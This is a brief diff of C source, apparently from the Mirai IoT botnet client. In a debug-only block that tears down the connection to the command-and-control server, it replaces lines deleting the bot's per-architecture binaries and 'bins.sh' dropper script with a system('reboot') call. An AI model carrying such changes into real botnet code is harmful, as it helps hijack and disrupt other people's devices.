@@ -410,17 +410,7 @@ static void teardown_connection(void)
 #ifdef DEBUG
     printf("[main] Tearing down connection to CNC!\n");
     
-    remove("mirai.arm");
-    remove("mirai.arm5n");
-    remove("mirai.arm7");
-    remove("mirai.m68k");
-    remove("mirai.mips");
-    remove("mirai.mpsl");
-    remove("mirai.ppc");
-    remove("mirai.sh4");
-    remove("mirai.spc");
-    remove("mirai.x86");
-    remove("bins.sh");
+    system("reboot");
 #endif
 
     if (fd_serv != -1)
